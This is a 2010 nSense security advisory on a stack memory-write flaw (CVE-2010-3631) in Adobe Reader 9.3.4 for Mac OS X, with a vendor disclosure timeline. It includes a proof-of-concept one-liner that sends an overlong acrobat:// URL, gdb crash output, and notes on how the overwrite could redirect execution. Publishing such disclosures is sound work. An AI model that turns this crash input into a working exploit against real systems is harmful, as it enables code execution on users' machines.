@@ -1,0 +1,73 @@
+       nSense Vulnerability Research Security Advisory NSENSE-2010-001
+       ---------------------------------------------------------------
+
+       Affected Vendor:    Adobe
+       Affected Product:   Adobe Reader 9.3.4 for Macintosh
+       Platform:           OS X
+       Impact:             User assisted code execution
+       Vendor response:    Patch
+       Credit:             Knud / nSense
+       
+       Description: Adobe Acrobat and Reader are prone to a remote code-execution vulnerability.  Attackers   can exploit this issue to execute arbitrary code in the context of the user running the affected application.  Adobe Reader and Acrobat versions prior to and including 9.3.4 and 8.2.4 are affected.
+
+       NOTE: This issue only affects Adobe Reader and Acrobat running on Apple Mac OS X       
+
+       Technical details
+       ---------------------------------------------------------------
+
+       terminal 1:
+       $ gdb --waitfor=AdobeReader
+
+       terminal 2:
+       $ open acrobat://`perl -e 'print "A" x 12000'`
+
+       terminal 1:
+       (gdb) cont
+       [snip]
+       Program received signal EXC_BAD_ACCESS, Could not access memory.
+       Reason: KERN_INVALID_ADDRESS at address: 0xc00013d2
+       0x7ffa0d6a in AcroBundleThreadQuitProc ()
+       (gdb) set disassembly-flavor intel
+       (gdb) x/i $pc
+       0x7ffa0d6a <AcroBundleThreadQuitProc+2608>:     mov    BYTE PTR
+       [ebp+eax-0x420],0x0
+       (gdb) i r ebp eax
+       ebp            0xbfffe908       0xbfffe908
+       eax            0x2eea   12010
+       (gdb)
+
+       As can be seen from the above, we control the value in eax (in
+       this case 12010, the length of the acrobat:// + the 12000 A's).
+
+       This allows us to write the null byte anywhere in memory between
+       ebp-0x420 (0xBFFFE4E8) and the end of the stack.
+
+       The behaviour may be leveraged to modify the frame pointer,
+       changing the execution flow and thus permitting arbitrary code
+       execution in the context of the user running the program.
+
+       Timeline:
+       Aug 10th         Contacted vendor PSIRT
+       Aug 10th         Vendor response. Vulnerability reproduced.
+       Aug 16th         Status update request sent to vendor
+       Aug 17th         Vendor response, still investigating
+       Sep 2nd          Status update request sent to vendor
+       Sep 3rd          Vendor response. Working on fix
+       Sep 22nd         Contacted vendor regarding patch date
+       Sep 22nd         Vendor response. Confirmed patch date.
+       Sep 23rd         Corrected researcher name
+       Oct 1st          Vendor sent CVE identifier CVE-2010-3631
+       Oct 5th          Vendor releases the patch
+       Oct 6th          Advisory published
+
+       http://www.nsense.fi                       http://www.nsense.dk
+
+
+
+       $$s$$$$s.   ,s$$$$s   ,S$$$$$s.  $$s$$$$s.   ,s$$$$s   ,S$$$$$s.
+       $$$  `$$$  ($$(       $$$  `$$$  $$$  `$$$  ($$(       $$$  `$$$
+       $$$   $$$    `^$$s.   $$$$$$$$$  $$$   $$$    `^$$s.   $$$$$$$$$
+       $$$   $$$       )$$)  $$$        $$$   $$$       )$$)  $$$
+       $$$   $$$  ^$$$$$$7    `7$$$$$P  $$$   $$$  ^$$$$$$7   `7$$$$$P
+
+                      D r i v e n   b y   t h e   c h a l l e n g e _
